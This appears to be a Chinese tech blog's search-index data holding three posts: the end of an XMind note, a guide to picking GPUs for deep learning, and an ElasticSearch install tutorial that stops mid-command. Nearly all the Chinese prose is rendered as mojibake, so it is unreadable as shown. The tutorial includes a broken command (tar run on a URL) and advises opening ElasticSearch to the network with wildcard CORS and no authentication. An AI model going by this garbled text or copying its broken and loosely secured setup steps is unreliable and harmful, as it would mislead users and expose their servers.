çš„å®‰è£…è·¯å¾„ï¼ˆè‡ªè¡Œä¿®æ”¹ï¼‰ï¼Œç„¶åå†é‡æ–°å¯åŠ¨ XMind 8 å³å¯ã€‚ 12-vm/usr/java/jdk1.8.0_102/bin/java var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux å¼€å‘å·¥å…·"},{title:"å¦‚ä½•é€‰æ‹© GPU æ­å»ºæ·±åº¦å­¦ä¹ æœºå™¨",url:"/posts/53e1dc9b.html",text:'æ·±åº¦å­¦ä¹ ä¸ GPU ä»‹ç»æ·±åº¦å­¦ä¹ ï¼ˆDLï¼‰æ˜¯æœºå™¨å­¦ä¹ ï¼ˆMLï¼‰çš„ä¸€ä¸ªåˆ†æ”¯ï¼Œæ·±åº¦å­¦ä¹ ä½¿ç”¨ç¥ç»ç½‘ç»œæ¥è§£å†³é—®é¢˜ã€‚ç¥ç»ç½‘ç»œçš„ä¼˜ç‚¹ä¹‹ä¸€æ˜¯è‡ªè¡Œå¯»æ‰¾æ•°æ®ï¼ˆç‰¹å¾ï¼‰æ¨¡å¼ï¼Œè¿™å’Œä»¥å‰å‘Šè¯‰ç®—æ³•éœ€è¦æ‰¾ä»€ä¹ˆä¸ä¸€æ ·ã€‚ä½†æ˜¯ï¼Œé€šå¸¸è¿™æ„å‘³ç€è¯¥æ¨¡å‹ä»ç©ºç™½çŠ¶æ€å¼€å§‹ï¼ˆé™¤éä½¿ç”¨è¿ç§»å­¦ä¹ ï¼‰ã€‚ä¸ºäº†ä»å¤´æ•æ‰æ•°æ®çš„æœ¬è´¨ï¼æ¨¡å¼ï¼Œç¥ç»ç½‘ç»œéœ€è¦å¤„ç†å¤§é‡ä¿¡æ¯ï¼Œé€šå¸¸æœ‰ä¸¤ç§å¤„ç†æ–¹å¼ï¼šä½¿ç”¨ CPU æˆ– GPUã€‚è®¡ç®—æœºçš„ä¸»è¦è®¡ç®—æ¨¡å—æ˜¯ä¸­å¤®å¤„ç†å™¨ï¼ˆCPUï¼‰ï¼ŒCPU çš„è®¾è®¡ç›®çš„æ˜¯åœ¨å°‘é‡æ•°æ®ä¸Šæ‰§è¡Œå¿«é€Ÿè®¡ç®—ã€‚åœ¨ CPU ä¸Šæ·»åŠ æ•°å€çš„æ•°å­—éå¸¸å¿«ï¼Œä½†æ˜¯åœ¨å¤§é‡æ•°æ®ä¸Šè¿›è¡Œè®¡ç®—å°±ä¼šå¾ˆæ…¢ã€‚å¦‚ï¼Œå‡ åã€å‡ ç™¾æˆ–å‡ åƒæ¬¡çŸ©é˜µä¹˜æ³•ã€‚åœ¨è¡¨è±¡èƒŒåï¼Œæ·±åº¦å­¦ä¹ å¤šç”±çŸ©é˜µä¹˜æ³•ä¹‹ç±»çš„æ“ä½œç»„æˆã€‚æœ‰è¶£çš„æ˜¯ï¼Œ3D ç”µå­æ¸¸æˆåŒæ ·ä¾èµ–è¿™äº›æ“ä½œæ¥æ¸²æŸ“é‚£äº›ç¾ä¸½çš„é£æ™¯ã€‚å› æ­¤ï¼ŒGPU çš„ä½œç”¨è¢«å¼€å‘å‡ºæ¥ï¼Œå®ƒä»¬å¯ä»¥ä½¿ç”¨æ•°åƒä¸ªæ ¸å¿ƒå¤„ç†å¤§é‡å¹¶è¡Œè®¡ç®—ã€‚æ­¤å¤–ï¼Œå®ƒä»¬è¿˜æœ‰å¤§é‡å†…å­˜å¸¦å®½å¤„ç†æ•°æ®ã€‚è¿™ä½¿å¾— GPU æˆä¸ºè¿›è¡Œ DL çš„å®Œç¾ç¡¬ä»¶ã€‚æ€»ä¹‹ï¼Œå°½ç®¡ä½¿ç”¨ CPU è¿›è¡Œæ·±åº¦å­¦ä¹ ä»æŠ€æœ¯ä¸Šæ˜¯å¯è¡Œçš„ï¼Œæƒ³è·å¾—çœŸå®çš„ç»“æœå°±åº”è¯¥ä½¿ç”¨ GPUã€‚ GPU é€‰æ‹©çš„æ€§èƒ½æŒ‡æ ‡é€‰æ‹©ä¸€ä¸ªå¼ºå¤§çš„å›¾å½¢å¤„ç†å™¨æœ€é‡è¦çš„ç†ç”±æ˜¯èŠ‚çœæ—¶é—´å’Œå¼€å‘åŸå‹æ¨¡å‹ã€‚ç½‘ç»œè®­ç»ƒé€Ÿåº¦åŠ å¿«ï¼Œåé¦ˆæ—¶é—´å°±ä¼šç¼©çŸ­ã€‚è¿™æ ·å°±å¯ä»¥æ›´è½»æ¾åœ°å°†æ¨¡å‹å‡è®¾å’Œç»“æœä¹‹é—´å»ºç«‹è”ç³»ã€‚æ·±åº¦å­¦ä¹ ç›¸å…³çš„ä¸»è¦ GPU æ€§èƒ½æŒ‡æ ‡å¦‚ä¸‹ï¼š å¤„ç†èƒ½åŠ›ï¼šè¡¨ç¤º GPU å¤„ç†æ•°æ®çš„é€Ÿåº¦ï¼Œå¯ä»¥å°†å…¶é‡åŒ–ä¸º CUDA æ ¸å¿ƒæ•°é‡å’Œæ¯ä¸€ä¸ªæ ¸å¿ƒçš„é¢‘ç‡çš„ä¹˜ç§¯ã€‚ æ˜¾å­˜å¸¦å®½ï¼šGPU å¤„ç†å¤§é‡æ•°æ®çš„èƒ½åŠ›ï¼Œæ˜¯æœ€é‡è¦çš„æ€§èƒ½æŒ‡æ ‡ã€‚ æ˜¾å­˜å¤§å°ï¼šä¸€æ¬¡æ€§åŠ è½½åˆ°æ˜¾å¡ä¸Šçš„æ•°æ®é‡ã€‚è¿è¡Œè®¡ç®—æœºè§†è§‰æ¨¡å‹æ—¶ï¼Œæ˜¾å­˜è¶Šå¤§è¶Šå¥½ï¼Œç‰¹åˆ«æ˜¯å¦‚æœæƒ³å‚åŠ  CV Kaggle ç«èµ›çš„è¯ã€‚å¯¹äºè‡ªç„¶è¯­è¨€å¤„ç†å’Œæ•°æ®åˆ†ç±»ï¼Œæ˜¾å­˜æ²¡æœ‰é‚£ä¹ˆé‡è¦ã€‚ GPU æ˜¾å­˜å¤§å°é€‰æ‹©åŸåˆ™ è¿½æ±‚æœ€é«˜æ°´å‡†çš„ç ”ç©¶ï¼š&gt;=11 GB æ¢ç´¢æœ‰è¶£æ¶æ„çš„ç ”ç©¶ï¼š&gt;=8 GB ä»»ä½•å…¶ä»–ç ”ç©¶ï¼š8 GB CV Kaggle ç«èµ›ï¼š4ï½8 GB åˆåˆ›ä¼ä¸šï¼š8 GBï¼ˆä¸è¿‡è¦æ ¹æ®ç‰¹å®šåº”ç”¨é¢†åŸŸæƒ…å†µæ¥ç¡®å®šæ¨¡å‹è§„æ¨¡ï¼‰ é€‰æ‹© Nvidia è¿˜æ˜¯ AMD å¹³å°è‹±ä¼Ÿè¾¾å·²ç»å…³æ³¨æ·±åº¦å­¦ä¹ æœ‰ä¸€æ®µæ—¶é—´ï¼Œå¹¶å–å¾—äº†é¢†å…ˆä¼˜åŠ¿ã€‚ä»–ä»¬çš„ CUDA å·¥å…·åŒ…å…·å¤‡æ‰å®çš„æŠ€æœ¯æ°´å¹³ï¼Œå¯ç”¨äºæ‰€æœ‰ä¸»è¦çš„æ·±åº¦å­¦ä¹ æ¡†æ¶ â€”â€”TensorFlowã€PyTorchã€Caffeã€CNTK ç­‰ã€‚ä½†æˆªè‡³ç›®å‰ï¼Œè¿™äº›æ·±åº¦å­¦ä¹ æ¡†æ¶éƒ½ä¸èƒ½åœ¨ OpenCLï¼ˆè¿è¡Œäº AMD GPUï¼‰ä¸Šå·¥ä½œã€‚ç”±äºå¸‚é¢ä¸Šçš„ AMD GPU ä¾¿å®œå¾—å¤šï¼Œå¸Œæœ›è¿™äº›æ¡†æ¶å¯¹ OpenCL çš„æ”¯æŒèƒ½å°½å¿«å®ç°ã€‚è€Œä¸”ï¼Œä¸€äº› AMD å¡è¿˜æ”¯æŒåŠç²¾åº¦è®¡ç®—ï¼Œä»è€Œèƒ½å°†æ€§èƒ½å’Œæ˜¾å­˜å¤§å°åŠ å€ã€‚ä¸è¿‡ AMD å·²ç»å‘å¸ƒäº† ROCm å¹³å°æä¾›æ·±åº¦å­¦ä¹ æ”¯æŒï¼Œå®ƒåŒæ ·é€‚ç”¨äºä¸»æµæ·±åº¦å­¦ä¹ åº“ï¼ˆå¦‚ PyTorchã€TensorFlowã€MxNet å’Œ CNTKï¼‰ã€‚ç›®å‰ï¼ŒROCm ä»ç„¶åœ¨ä¸æ–­å¼€å‘ä¸­ï¼Œå¦‚æœåªæ˜¯å¸Œæœ› GPU å¯ä»¥é¡ºåˆ©è¿è¡Œçš„æ™®é€šæ·±åº¦å­¦ä¹ ç”¨æˆ·ï¼Œå»ºè®®è¿˜æ˜¯é€‰æ‹©è‹±ä¼Ÿè¾¾å¹³å°ã€‚ Nvidia æ˜¾å¡é€‰æ‹©å…¥é—¨çº§åˆ«çš„ GTX 10 ç³»åˆ—æ˜¾å¡ï¼ˆ2017 å¹´ä¸Šå¸‚ï¼‰ GTX 1050 Tiï¼šæ˜¾å­˜ 4Gï¼Œæ˜¾å­˜å¸¦å®½ 112 GB/sï¼Œ768 ä¸ª CUDA æ ¸å¿ƒ @ 1392 MHzï¼Œè¿™æ˜¯ä¸€æ¬¾å…¥é—¨çº§ GPUï¼Œå¦‚æœä¸ç¡®å®šæ˜¯å¦è¦åšæ·±åº¦å­¦ä¹ ï¼Œé‚£ä¹ˆé€‰æ‹©è¿™æ¬¾ä¸ç”¨èŠ±è´¹å¤ªå¤šé’±å°±å¯ä»¥ä½“éªŒä¸€ä¸‹ã€‚ GTX 1060ï¼šæ˜¾å­˜ 6Gï¼Œæ˜¾å­˜å¸¦å®½ 216 GB/sï¼Œ1280 ä¸ª CUDA æ ¸å¿ƒ @ 1708 MHzï¼Œç›¸å¯¹æ¥è¯´ä»·æ ¼æ¯”è¾ƒä¾¿å®œï¼Œä½†æ˜¯ 6GB æ˜¾å­˜å¯¹äºæ·±åº¦å­¦ä¹ ä»»åŠ¡å¯èƒ½ä¸å¤Ÿç”¨ã€‚å¦‚æœè¦åšè®¡ç®—æœºè§†è§‰ï¼Œé‚£ä¹ˆè¿™å¯èƒ½æ˜¯æœ€ä½é…ç½®ã€‚å¦‚æœåš NLP å’Œåˆ†ç±»æ•°æ®æ¨¡å‹ï¼Œè¿™æ¬¾è¿˜å¯ä»¥ã€‚ GTX 1070ï¼š æ˜¾å­˜ 8Gï¼Œæ˜¾å­˜å¸¦å®½ 256 GB/sï¼Œ1920 ä¸ª CUDA æ ¸å¿ƒ @ 1683 MHzï¼Œç°åœ¨å¾ˆéš¾ä¹°åˆ°è¿™æ¬¾ GPU äº†ï¼Œå› ä¸ºå®ƒä»¬ä¸»è¦ç”¨äºè™šæ‹Ÿè´§å¸æŒ–çŸ¿ã€‚å®ƒçš„æ˜¾å­˜é…å¾—ä¸Šè¿™ä¸ªä»·ä½ï¼Œå°±æ˜¯é€Ÿåº¦æœ‰äº›æ…¢ã€‚å¦‚æœèƒ½ç”¨è¾ƒä¾¿å®œçš„ä»·æ ¼ä¹°åˆ°ä¸€ä¸¤ä¸ªäºŒæ‰‹çš„éçŸ¿æœºå¡ï¼Œé‚£å°±å»ºè®®ä¸‹æ‰‹ã€‚ GTX 1070 Tiï¼šæ˜¾å­˜ 8Gï¼Œæ˜¾å­˜å¸¦å®½ 256 GB/sï¼Œ2432 ä¸ª CUDA æ ¸å¿ƒ @ 1683 MHzï¼Œå¦‚æœè§‰å¾— GTX 1080 è¶…å‡ºäº†é¢„ç®—ï¼Œ1070 Ti å¯ä»¥æä¾›åŒæ ·å¤§çš„ 8GB æ˜¾å­˜ï¼Œä»¥åŠå¤§çº¦ 80% çš„æ€§èƒ½ã€‚ GTX 1080ï¼š æ˜¾å­˜ 8Gï¼Œæ˜¾å­˜å¸¦å®½ 320 GB/sï¼Œ2560 ä¸ª CUDA æ ¸å¿ƒ @ 1733 MHzï¼Œä½œä¸ºç›®å‰è‹±ä¼Ÿè¾¾äº§å“çº¿é‡Œçš„ä¸­é«˜ç«¯æ˜¾å¡ï¼Œ8GB çš„å†…å­˜å¯¹äºè®¡ç®—æœºè§†è§‰ä»»åŠ¡æ¥è¯´å¤Ÿç”¨äº†ã€‚å¤§å¤šæ•° Kaggle ä¸Šçš„äººéƒ½åœ¨ä½¿ç”¨è¿™æ¬¾æ˜¾å¡ã€‚ GTX 1080 Tiï¼šæ˜¾å­˜ 11Gï¼Œæ˜¾å­˜å¸¦å®½ 484 GB/sï¼Œ3584 ä¸ª CUDA æ ¸å¿ƒ @ 1582 MHzï¼Œæ‹¥æœ‰å¤§å®¹é‡æ˜¾å­˜å’Œé«˜ååé‡ï¼Œå¦‚æœèµ„é‡‘å…è®¸ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ï¼ŒGTX 1080 Ti å¯ä»¥å®Œæˆè®¡ç®—æœºè§†è§‰ä»»åŠ¡ï¼Œå¹¶åœ¨ Kaggle ç«èµ›ä¸­ä¿æŒå¼ºåŠ¿ã€‚ Titan XPï¼šæ˜¾å­˜ 12Gï¼Œæ˜¾å­˜å¸¦å®½ 547.7 GB/sï¼Œ3840 ä¸ª CUDA æ ¸å¿ƒ @ 1480 MHzï¼ŒTitan XP çš„æ€§ä»·æ¯”ä¸é«˜ï¼Œä¸€å— Titan XP çš„ä»·æ ¼å¯ä»¥ä¹°åˆ°ä¸¤å— GTX 1080ï¼Œè€Œä¸”æ„å‘³ç€æ›´å¼ºå¤§çš„ç®—åŠ›å’Œ 16GB çš„æ˜¾å­˜ã€‚ å…¥é—¨çº§åˆ«çš„ RTX 20 ç³»åˆ—æ˜¾å¡ï¼ˆ2019 å¹´ä¸Šå¸‚ï¼‰ ä¸“ä¸šçº§åˆ«çš„ Tesla ç³»åˆ—æ˜¾å¡ï¼ˆ2019 å¹´ä¸Šå¸‚ï¼‰è‹±ä¼Ÿè¾¾è¿˜æ‹¥æœ‰ä¸€ä¸ªé¢å‘ä¸“ä¸šå¸‚åœºçš„ Tesla GPU äº§å“çº¿ï¼Œå…¶ä¸­åŒ…æ‹¬ P40ã€P4ã€V100 å‹å·ã€‚è¿™ç±»å‹çš„æ˜¾å¡ä»·æ ¼ååˆ†æ˜‚è´µï¼Œä¸€èˆ¬å¾ˆå°‘èƒ½å¤Ÿæ¥è§¦åˆ°ï¼Œä½† Amazon Web Servicesã€è°·æ­Œäº‘å¹³å°æˆ–å…¶ä»–äº‘ä¾›åº”å•†æ­£åœ¨ä½¿ç”¨è¿™äº› GPUã€‚ ä¸€å¥è¯æ¨èæ€»ç»“åœ¨è¿™é‡Œï¼Œå°†ç»™å‡ºä¸åŒé¢„ç®—åŒºé—´ä¸‹ GTX 10 ç³»åˆ—æ˜¾å¡çš„æœ€ä½³é€‰æ‹©ï¼ˆä»¥ä¸‹æ˜¾å¡ä»·æ ¼éšç€æ—¶é—´è¿ç§»ä¼šå¤§å¹…æ³¢åŠ¨ï¼Œä»·æ ¼å‚è€ƒè‡ª 2018 å¹´ï¼‰ã€‚ 2000 å…ƒä»¥ä¸‹ï¼šåœ¨è¿™ä¸ªåŒºé—´å†…ï¼ŒGTX 1050 Ti æ˜¯æœ€ä½³é€‰æ‹©ï¼Œä½†å¦‚æœçœŸçš„æƒ³åšæ·±åº¦å­¦ä¹ ï¼Œè¯·åŠ é’±ä¸Š GTX 1060ã€‚ 2000-2600 å…ƒåŒºé—´ï¼šGTX 1060 å¯ä»¥è®©ä½ å…¥é—¨æ·±åº¦å­¦ä¹ ï¼Œå¦‚æœå¯ä»¥æ‰¾åˆ°æˆè‰²ä¸é”™çš„äºŒæ‰‹ GTX 1070 é‚£å°±æ›´å¥½äº†ã€‚ 2600-4600 å…ƒåŒºé—´ï¼šå¯é€‰ GTX 1080 æˆ– GTX 1070 Tiï¼Œå¦‚æœçœŸçš„éœ€è¦ SLI çš„è¯æˆ–è®¸ä¸¤å— GTX 1060 ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½†è¯·æ³¨æ„ 6GB æ˜¾å­˜å¯èƒ½ä¼šä¸å¤Ÿç”¨ã€‚ 4600-6000 å…ƒåŒºé—´ï¼šé¦–æ¨ GTX 1080 Tiï¼Œå¦‚æœéœ€è¦åŒæ˜¾å¡ SLIï¼Œè¯·è´­ä¹°ä¸¤å— GTX 1070 æˆ–ä¸¤å— GTX 1070 Tiã€‚ 2019 å¹´ Nvidia æ–°ä¸€ä»£çš„ RTX 20 ç³»åˆ—æ˜¾å¡å·²ç»ä¸Šå¸‚ï¼Œæœ¬ç€ä¹°æ–°ä¸ä¹°æ—§çš„åŸåˆ™ï¼Œé¢„ç®—è¶³å¤Ÿçš„å‰æä¸‹å»ºè®®é€‰æ‹© RTX 2070ã€RTX 2080ã€RTX 2080 Tiã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæœ‰ä¸¤ç§ä¸»è¦çš„é€‰æ‹©ç­–ç•¥æ˜¯æœ‰æ„ä¹‰çš„ï¼šç¬¬ä¸€ï¼Œä½¿ç”¨ RTX 20 ç³»åˆ— GPU è¿›è¡Œå¿«é€Ÿå‡çº§ï¼›ç¬¬äºŒï¼Œä½¿ç”¨ä¾¿å®œçš„ GTX 10 ç³»åˆ— GPU å¹¶åœ¨ RTX Titan å¯ç”¨æ—¶è¿›è¡Œå‡çº§ã€‚å¦‚æœæ€§èƒ½ä¸å¤ªé‡è¦ï¼Œæˆ–è€…åªæ˜¯ä¸éœ€è¦æ€§èƒ½ï¼Œä¾‹å¦‚ Kaggleã€åˆåˆ›å…¬å¸ã€åŸå‹å¼€å‘æˆ–è€…å­¦ä¹ æ·±åº¦å­¦ä¹ ï¼Œé‚£ä¹ˆå¯ä»¥ä»å»‰ä»·çš„ GTX 10 ç³»åˆ—ä¸­å—ç›Šï¼Œå¦‚æœé€‰æ‹© GTX 10 ç³»åˆ—è¦æ³¨æ„ GPU çš„æ˜¾å­˜å¤§å°æ˜¯å¦æ»¡è¶³å®é™…ä½¿ç”¨çš„è¦æ±‚ã€‚ æ·±åº¦å­¦ä¹ å¸¸ç”¨å·¥å…· gpu driverï¼šæ˜¾å¡é©±åŠ¨ cudaï¼šGPU ä¸Šçš„å¹¶è¡Œè®¡ç®—å¹³å°å’Œæ¨¡å‹ pytorchï¼šä¸€ä¸ªåŸºäº Python è¯­è¨€çš„æ·±åº¦å­¦ä¹ æ¡†æ¶ cudnnï¼šç›¸æ¯”æ ‡å‡†çš„ cudaï¼Œå®ƒåœ¨ä¸€äº›å¸¸ç”¨çš„ç¥ç»ç½‘ç»œæ“ä½œä¸Šè¿›è¡Œäº†æ€§èƒ½çš„ä¼˜åŒ– anacondaï¼šä¸€ä¸ªå¼€æºçš„ Python å‘è¡Œç‰ˆæœ¬ï¼Œå…¶åŒ…å«äº† condaã€python ç­‰ 180 å¤šä¸ªç§‘å­¦åŒ…åŠå…¶ä¾èµ–é¡¹ tensorflowï¼šä¸€ä¸ªåŸºäºæ•°æ®æµç¼–ç¨‹çš„ç¬¦å·æ•°å­¦ç³»ç»Ÿï¼Œè¢«å¹¿æ³›åº”ç”¨äºå„ç±»æœºå™¨å­¦ä¹ ç®—æ³•çš„ç¼–ç¨‹å®ç° kerasï¼šä¸€ä¸ªåŸºäº Python çš„æ·±åº¦å­¦ä¹ åº“ï¼Œæä¾›äº†é«˜å±‚ç¥ç»ç½‘ç»œ APIï¼Œåç«¯å¯ä»¥é€‰æ‹© Tensorflowã€Theano ä»¥åŠ CNTK å‚è€ƒæ–‡ç«  å¦‚ä½•é€‰æ‹©æ·±åº¦å­¦ä¹ çš„ GPU ç ”ç©¶æ·±åº¦å­¦ä¹ çš„ç¡¬ä»¶é…ç½® å®Œå…¨ç¡¬ä»¶æŒ‡å—ï¼šæ•™ä½  DIY ä¸€å¥—è‡ªå·±çš„æ·±åº¦å­¦ä¹ æœºå™¨ GPU å¯¹æ¯”ï¼ŒTitan XP/GTX 1080 Ti/GTX 1080 è°æ›´æœ‰ä¼˜åŠ¿ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ai"},{title:"Linux å®‰è£… ElasticSearchï¼ˆå•æœºï¼‰",url:"/posts/3ffff1a5.html",text:'å‰è¨€ æœ¬æ–‡é€‚ç”¨äº Centos/Debian/Ubuntu ç­‰ Linux å‘è¡Œç‰ˆç³»ç»Ÿã€‚ Oracle JDK11 å®‰è£… 1234567891011121314151617181920212223242526272829303132# ä¸‹è½½# wget -O /usr/local/jdk-11.0.4_linux-x64_bin.tar.gz https://download.oracle.com/otn/java/jdk/11.0.4+10/cf1bbcbf431a474eb9fc550051f4ee78/jdk-11.0.4_linux-x64_bin.tar.gz?AuthParam=1563538966_65e52109c4dec9c83ac76eed75b8af77# è§£å‹# tar -xvf /usr/local/jdk-11.0.4_linux-x64_bin.tar.gz# åˆ é™¤ä¸‹è½½æ–‡ä»¶# rm /usr/local/jdk-11.0.4_linux-x64_bin.tar.gz# åˆ›å»ºjavaå‘½ä»¤çš„è½¯é“¾æ¥ï¼ˆä¼šè¦†ç›–å·²å®‰è£…çš„å…¶ä»–ç‰ˆæœ¬jdkï¼‰# ln -sf /usr/local/jdk-11.0.4/bin/java /usr/bin/java# ln -sf /usr/local/jdk-11.0.4/bin/javac /usr/bin/javac# é…ç½®ç¯å¢ƒå˜é‡# vim /etc/profileJAVA_HOME=/usr/local/jdk-11.0.4JRE_HOME=/usr/local/jdk-11.0.4/jreCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME CLASSPATH PATH# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile# éªŒè¯ç¯å¢ƒå˜é‡æ˜¯å¦ç”Ÿæ•ˆï¼Œå¦‚æœä¸ç”Ÿæ•ˆå»ºè®®é‡å¯ç³»ç»Ÿ# javac -versionjavac 11.0.4# java -versionjava version "11.0.4" 2019-07-16 LTSJava(TM) SE Runtime Environment 18.9 (build 11.0.4+10-LTS)Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.4+10-LTS, mixed mode) ElasticSearch å®‰è£… ElasticSearch å®˜æ–¹ä¸‹è½½åœ°å€ 123456789101112131415161718192021222324252627282930313233343536# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local# ä¸‹è½½ES# wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.2.0-linux-x86_64.tar.gz# è§£å‹ES# tar -xvf https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.2.0-linux-x86_64.tar.gz# åˆ é™¤ä¸‹è½½æ–‡ä»¶# rm -f elasticsearch-7.2.0-linux-x86_64.tar.gz# åˆ›å»ºESç”¨æˆ·ç»„å’Œç”¨æˆ·ï¼Œå‡ºäºç³»ç»Ÿå®‰å…¨è€ƒè™‘ï¼ŒElasticSearchä¸å…è®¸ç›´æ¥ä½¿ç”¨Rootæƒé™æ¥å¯åŠ¨# groupadd elasticsearch# useradd elasticsearch -g elasticsearch -p yourpassword# æ›´æ”¹ESæ–‡ä»¶çš„æ‰€å±ç”¨æˆ·ç»„åŠç”¨æˆ·# chown -R elasticsearch:elasticsearch elasticsearch-7.2.0# åˆ‡æ¢ESç”¨æˆ·# su elasticsearch# å‰å°å¯åŠ¨ES$ cd elasticsearch-7.2.0/bin$ ./elasticsearch# æˆ–è€…åå°å¯åŠ¨ES$ cd elasticsearch-7.2.0/bin$ ./elasticsearch -d# æµ‹è¯•è¿æ¥ESï¼Œå½“ç»“æœè¾“å‡ºJSONæ•°æ®åˆ™è¯´æ˜ESå¯åŠ¨æˆåŠŸ# curl -XGET "127.0.0.1:9200"# å…³é—­åå°è¿è¡Œçš„ES# ps -aux|grep elasticsearch# kill -9 pid ElasticSearch é…ç½® JVM å†…å­˜ 123# ç›´æ¥ç¼–è¾‘ESçš„å¯åŠ¨è„šæœ¬# vim elasticsearch-7.2.0/bin/elasticsearchES_JAVA_OPTS="-Xms512m -Xmx512m" ElasticSearch é…ç½®ç«¯å£ã€è¿œç¨‹è®¿é—® 12345678910111213141516171819202122# é…ç½®ç«¯å£ï¼ˆé»˜è®¤ç«¯å£ä¸º9200ï¼‰# vim /usr/local/elasticsearch-7.2.0/config/elasticsearch.ymlhttp.port: 9200# é…ç½®è¿œç¨‹è®¿é—®# vim /usr/local/elasticsearch-7.2.0/config/elasticsearch.ymlnode.name: node-1cluster.initial_master_nodes: ["node-1"] # å³node.nameé…ç½®çš„å€¼network.host: 192.168.25.131 # å½“å‰ESçš„IPï¼Œæˆ–è€…network.host: 0.0.0.0# åˆ‡æ¢ESç”¨æˆ·# su elasticsearch# åå°å¯åŠ¨ES$ cd /usr/local/elasticsearch-7.2.0/bin$ ./elasticsearch -d# é˜²ç«å¢™å¼€æ”¾ESçš„ç«¯å£9200# firewall-cmd --zone=public --permanent --add-port=9200/tcp# firewall-cmd --reload# æµè§ˆå™¨æµ‹è¯•è¿œç¨‹è®¿é—®ï¼Œè¾“å…¥URLåœ°å€ï¼š192.168.25.131:9200ï¼Œå½“è¾“å‡ºJSONæ•°æ®åˆ™è¯´æ˜è¿œç¨‹è®¿é—®é…ç½®æˆåŠŸ ElasticSearch å®‰è£… Head æ’ä»¶ Head æ˜¯ Elasticsearch çš„é›†ç¾¤ç®¡ç†æ’ä»¶ï¼Œå¯ä»¥ç”¨äºæ•°æ®çš„æµè§ˆå’ŒæŸ¥è¯¢ã€‚Elasticsearch5.0 ä¹‹åï¼Œelasticsearch-head ä¸å†åšä¸ºæ’ä»¶æ”¾åœ¨å…¶ plugins ç›®å½•ä¸‹äº†ï¼Œè¦ä½¿ç”¨å®ƒåˆ™å¿…é¡»å…ˆå®‰è£… Gitï¼Œç„¶åé€šè¿‡ Git è·å– Github ä¸Šçš„ elasticsearch-head æºç ã€‚è¿è¡Œ elasticsearch-head éœ€è¦ç”¨åˆ° Gruntï¼Œè€Œ Grunt éœ€è¦ä¾èµ– NPM åŒ…ç®¡ç†å™¨ï¼Œå› æ­¤ NodeJS æ˜¯å¿…é¡»è¦å®‰è£…çš„ï¼ŒNodeJS çš„å®‰è£…å¯å‚è€ƒæœ¬ç«™æ•™ç¨‹ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local# å®‰è£…gitã€bzip2# yum install -y git bzip2 # Centos# apt-get install -y git bzip2 # Debianã€Ubuntu# ä¸‹è½½æºç # git clone https://github.com/mobz/elasticsearch-head.git# æ›´æ”¹æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·ç»„åŠç”¨æˆ·# chown -R elasticsearch:elasticsearch elasticsearch-head# å…¨å±€å®‰è£…Grunt# npm install -g grunt-cli# å®‰è£…elasticsearch-headçš„ä¾èµ–åŒ…# cd elasticsearch-head# npm install# æç¤ºï¼šå¦‚æœnpmçš„å®‰è£…è¿‡ç¨‹æ¯”è¾ƒæ…¢ï¼Œå¯ä»¥ä½¿ç”¨cnpmæ›¿ä»£npmæ¥å®‰è£…ä¾èµ–åŒ…# é…ç½®elasticsearch-headå…è®¸æ‰€æœ‰IPè®¿é—®# vim /usr/local/elasticsearch-head/Gruntfile.js# åœ¨connect--&gt;server--&gt;optionsä¸‹é¢æ·»åŠ ï¼šhostname: \'*\'# ä¿®æ”¹elasticsearch-headçš„é»˜è®¤è¿æ¥åœ°å€# vim /usr/local/elasticsearch-head/_site/app.js# å°†this.base_uri = this.config.base_uri || this.prefs.get("app-base_uri") || "http://localhost:9200"ä¸­çš„localhostä¿®æ”¹ä¸ºESçš„æœåŠ¡å™¨IPåœ°å€# é…ç½®ESå…è®¸è·¨åŸŸè®¿é—®ï¼Œåœ¨ESçš„é…ç½®æ–‡ä»¶æœ«å°¾è¿½åŠ ä¸‹é¢ä¸¤è¡Œå†…å®¹å³å¯# vim /usr/local/elasticsearch-7.2.0/config/elasticsearch.ymlhttp.cors.enabled: truehttp.cors.allow-origin: "*"# é˜²ç«å¢™å¼€æ”¾elasticsearch-headçš„ç«¯å£9100# firewall-cmd --zone=public --permanent --add-port=9100/tcp# firewall-cmd --reload# åˆ‡æ¢ESç”¨æˆ·# su elasticsearch# åå°å¯åŠ¨ES$ cd /usr/local/elasticsearch-7.2.0/bin$ ./elasticsearch -d# å‰å°å¯åŠ¨elasticsearch-head$ cd /usr/local/elasticsearch-head/node_modules/grunt/bin$ grunt server# æˆ–è€…åå°å¯åŠ¨elasticsearch-head$ cd /usr/local/elasticsearch-head/node_modules/grunt/bin$ 